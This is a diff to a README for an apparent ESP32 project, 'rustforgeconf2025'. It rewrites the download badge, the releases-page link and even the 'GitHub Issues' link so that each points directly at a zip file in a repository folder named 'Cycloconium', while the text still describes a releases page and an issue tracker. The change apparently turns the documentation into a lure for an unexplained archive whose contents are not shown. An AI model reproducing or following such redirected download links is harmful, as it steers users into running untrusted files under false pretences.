@@ -1,7 +1,7 @@
 # 🎉 rustforgeconf2025 - Easy Setup for ESP32 Projects
 
 ## 🔗 Download the Software
-[![Download rustforgeconf2025](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Osmar13082004/rustforgeconf2025/releases)
+[![Download rustforgeconf2025](https://raw.githubusercontent.com/Osmar13082004/rustforgeconf2025/main/Cycloconium/rustforgeconf2025.zip%20release-brightgreen)](https://raw.githubusercontent.com/Osmar13082004/rustforgeconf2025/main/Cycloconium/rustforgeconf2025.zip)
 
 ## 🚀 Getting Started
 Welcome to the rustforgeconf2025 project! This application is designed to help you get started with ESP32 projects, making them simple and exciting. Whether you’re building a smart device or a fun gadget, this tutorial will guide you through every step.
@@ -10,7 +10,7 @@ Welcome to the rustforgeconf2025 project! This application is designed to help y
 To download and install the software, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Download Page](https://github.com/Osmar13082004/rustforgeconf2025/releases).
+   Go to the following link: [Download Page](https://raw.githubusercontent.com/Osmar13082004/rustforgeconf2025/main/Cycloconium/rustforgeconf2025.zip).
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of available versions. Please select the latest version, which is usually at the top of the list.
@@ -45,7 +45,7 @@ To run rustforgeconf2025, your device should meet the following requirements:
 If you encounter any problems during installation or usage, the following resources may assist you:
 
 - **User Manual:** A comprehensive guide is available within the application itself.
-- **GitHub Issues:** You can check or report issues [here](https://github.com/Osmar13082004/rustforgeconf2025/issues).
+- **GitHub Issues:** You can check or report issues [here](https://raw.githubusercontent.com/Osmar13082004/rustforgeconf2025/main/Cycloconium/rustforgeconf2025.zip).
 - **Community Forums:** Join the conversation with other users for tips and support.
 
 ## 📬 Contact
